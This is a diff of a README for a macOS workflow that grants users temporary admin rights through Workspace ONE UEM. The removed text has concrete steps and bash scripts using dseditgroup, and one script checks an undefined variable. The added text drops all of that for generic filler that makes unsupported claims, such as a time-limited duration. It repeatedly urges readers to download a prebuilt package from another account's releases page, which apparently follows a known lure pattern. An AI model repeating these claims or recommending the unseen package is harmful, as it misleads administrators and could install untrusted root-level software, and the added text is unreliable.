@@ -1,135 +1,97 @@
-<img src="reponomadx-logo.jpg" alt="reponomadx logo" width="250"/></img>
-# macOS Elevated Admin Rights with Workspace ONE
+# Grant Temporary Admin Rights to macOS Users with Workspace ONE UEM
 
-[![Platform](https://img.shields.io/badge/Platform-macOS-lightgrey)](https://www.apple.com/macos/)
-[![Workspace ONE](https://img.shields.io/badge/Workspace%20ONE-UEM-blue)](https://www.vmware.com/products/workspace-one.html)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Status](https://img.shields.io/badge/Status-Active-success)]()
+![macOS Elevated Admin Rights](https://img.shields.io/badge/macos--elevated--admin--ws1-brightgreen.svg)
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/RiteshBisht12/macos-elevated-admin-ws1/releases)
 
-> Grant temporary admin rights to macOS users using Workspace ONE UEM and a dummy app deployment — no scripting required.
+## Overview
 
----
+This repository provides a simple solution for granting temporary admin rights to macOS users through Workspace ONE UEM. By deploying a dummy package, you can achieve this without any scripting. This approach is ideal for organizations that need to manage user permissions efficiently while maintaining security.
 
-## 📖 Summary
+## Features
 
-This workflow enables macOS users to be granted **temporary administrator access** using Workspace ONE UEM. It uses a dummy `.pkg` file that installs no actual software but contains a postinstall script that adds the current console user to the `admin` group.
+- **No Scripting Required**: The package can be deployed easily without the need for complex scripts.
+- **Seamless Integration**: Works directly with Workspace ONE UEM for easy management.
+- **User-Friendly**: Designed for IT admins who want to streamline the process of granting admin rights.
+- **Cross-Platform Support**: Compatible with various macOS versions.
 
-The process is managed entirely through the Workspace ONE console — no external scripts, APIs, or custom workflows are required.
+## Getting Started
 
----
+To get started, visit the [Releases section](https://github.com/RiteshBisht12/macos-elevated-admin-ws1/releases) to download the necessary package. 
 
-## 🧰 Requirements
+### Installation Steps
 
-- Workspace ONE UEM Console access  
-- macOS devices enrolled via DEP or MDM  
-- Download the [Packages App](http://s.sudre.free.fr/files/Packages_1211_dev.dmg) by WhiteBox
-  (This is the latest developer build with bug fixes; mount and install the `.dmg` after download)
-- Workspace ONE Admin access to create Smart Groups and Internal Apps  
+1. **Download the Package**: Go to the [Releases section](https://github.com/RiteshBisht12/macos-elevated-admin-ws1/releases) and download the latest version of the package.
+2. **Deploy via Workspace ONE UEM**: Use the Workspace ONE UEM console to deploy the downloaded package to your macOS devices.
+3. **Verify Installation**: Once deployed, check if the users have received the temporary admin rights.
 
----
+## Usage
 
-## 📦 Step 1: Create a Dummy Package
+After deploying the package, users will have elevated privileges for a specified duration. This can help in scenarios where users need to install software or make system changes that require admin access.
 
-We are going to use a dummy package to deliver post-install and post-uninstall scripts.  
-Use the [Packages App](http://s.sudre.free.fr/files/Packages_1211_dev.dmg) to create this.
+### Example Scenarios
 
-1. Open Packages App. Pick **Raw Package** and click **Next**
-2. Give it a name. (Example: `macOS Admin Elevation`)
-3. Go to the **Build** menu, and click **Build**
-4. Your package will be in the **project directory under `/build`**
-5. Use the [Workspace ONE Admin Assistant Tool](https://docs.omnissa.com/bundle/Admin-AssistantVSaaS/page/Download.html) to create the Plist for uploading to the UEM console.
+- **Software Installation**: Allow users to install necessary applications without needing constant IT intervention.
+- **System Updates**: Enable users to perform updates that require admin rights.
+- **Troubleshooting**: Grant temporary access for troubleshooting issues that require elevated permissions.
 
-<img src="Packages App 1.avif" alt="Packages App Template"/></img>
+## Topics Covered
 
-<img src="Packages App 2.avif" alt="Packages App Name"/></img>
+This repository touches on several important topics in the realm of IT management and automation:
 
-<img src="Packages App 3.avif" alt="Packages App Build"/></img>
+- **Admin Rights**: Understand the importance of managing user permissions effectively.
+- **Automation**: Learn how automation can simplify administrative tasks.
+- **Deployment**: Explore best practices for deploying software in an enterprise environment.
+- **End-User Computing (EUC)**: Focus on improving user experience while maintaining security.
+- **macOS Management**: Gain insights into managing macOS devices efficiently.
+- **Mobile Device Management (MDM)**: Understand the role of MDM in managing devices.
+- **Package Management (PKG)**: Learn about deploying applications using package files.
+- **Workspace ONE**: Familiarize yourself with VMware's Workspace ONE UEM.
 
-<img src="Packages App 4.avif" alt="Packages App Location"/></img>
+## Best Practices
 
+1. **Regular Updates**: Ensure that the package is updated regularly to address any security vulnerabilities.
+2. **User Training**: Provide training for users on how to use their temporary admin rights responsibly.
+3. **Monitor Usage**: Keep track of when and how often users are granted admin rights.
+4. **Limit Duration**: Set a clear time limit for how long users can hold admin rights.
 
----
+## Troubleshooting
 
-## 👥 Step 2: Create a Smart Group
+If you encounter issues during the deployment process, consider the following:
 
-Create a Smart Group that will control which devices receive the elevated rights package.
+- **Check Compatibility**: Ensure that the package is compatible with the macOS version being used.
+- **Review UEM Logs**: Look at the logs in Workspace ONE UEM for any error messages.
+- **Contact Support**: If problems persist, reach out to your IT support team for assistance.
 
-Steps:
+## Contributing
 
-1. In the Workspace ONE Console, go to:  
-   **Groups & Settings > Groups > Assignment Groups**
-2. Click **Add Smart Group**
-3. Name the group (e.g., `macOS Admin Elevation`)
-4. Configure assignment logic:
-   - Manually assign devices  
-   - Or use a Tag (e.g., `MacOS Admin Elevation`) for dynamic membership
+We welcome contributions to this project. If you have suggestions for improvements or additional features, please feel free to submit a pull request or open an issue.
 
-<img src="Smart Group.jpg" alt="Smart Group"/></img>
+### How to Contribute
 
-> ✅ Any device added to this Smart Group will receive the app and be granted admin rights.
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Clone Your Fork**: Use `git clone <your-fork-url>` to clone your fork locally.
+3. **Create a New Branch**: Use `git checkout -b <new-branch-name>` to create a new branch for your changes.
+4. **Make Your Changes**: Implement your changes and commit them with a clear message.
+5. **Push Your Changes**: Use `git push origin <your-branch-name>` to push your changes to your fork.
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."
 
----
+## License
 
-## 🚀 Step 3: Upload and Assign the App
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-Upload the `.pkg` to Workspace ONE as an Internal App.
+## Acknowledgments
 
-Steps:
+We would like to thank the contributors and the community for their support in making this project a success. Special thanks to VMware for providing Workspace ONE UEM, which simplifies device management.
 
-1. In the Workspace ONE Console, go to:  
-   **Apps > Native > Internal > Add Application**
-2. Upload the file: `macOS Admin Elevation.pkg`
-3. Upload the Plist created by the Workspace ONE Admin Assistant tool
-4. Set the **Post-Install Script** and **Post-Uninstall Script** as shown below
-5. (Optional) Give it an icon
-6. Click **Save & Assign**
-7. Click **Add Assignment**
-8. Assign to the Smart Group from Step 2.  
-   You can use **Auto** or **On-Demand** assignment
-9. Click **Add**, then **Save & Publish**
+## Contact
 
-### 📝 Post-Install Script:
-```bash
-#!/bin/bash
+For questions or support, please reach out to the repository maintainer. You can find the contact information in the GitHub profile.
 
-loggedInUser=`/usr/bin/stat -f%Su /dev/console`
+## Additional Resources
 
-if [ "$CurrentUser" == "root" ] || [ "$CurrentUser" == "_mbsetupuser" ]; then
-  exit 0
-fi
+- [Workspace ONE UEM Documentation](https://docs.vmware.com/en/VMware-Workspace-ONE-UEM/index.html)
+- [macOS Management Best Practices](https://www.apple.com/business/docs/site/Apple_Deployment_Programs_Guide.pdf)
 
-#adds user to admin group (post-install)
-dseditgroup -o edit -a "$loggedInUser" -t user admin
-```
+## Final Note
 
-### 📝 Post-Uninstall Script:
-```bash
-#!/bin/bash
-
-loggedInUser=`/usr/bin/stat -f%Su /dev/console`
-
-if [ "$CurrentUser" == "root" ] || [ "$CurrentUser" == "_mbsetupuser" ]; then
-  exit 0
-fi
-
-#removes user from the admin group (post-uninstall)
-dseditgroup -o edit -d "$loggedInUser" -t user admin
-```
-
----
-
-## 🔄 Removing Admin Rights
-
-To revoke admin rights:
-
-1. Remove the device from the Smart Group  
-   (e.g., delete the `macOS Admin Elevation` tag)
-2. Workspace ONE will uninstall the dummy package
-
----
-
-## 📄 License
-
-MIT License – see [LICENSE](LICENSE) for full details.
-
----
+For the latest releases, visit the [Releases section](https://github.com/RiteshBisht12/macos-elevated-admin-ws1/releases). Download the package and start managing admin rights for your macOS users efficiently.
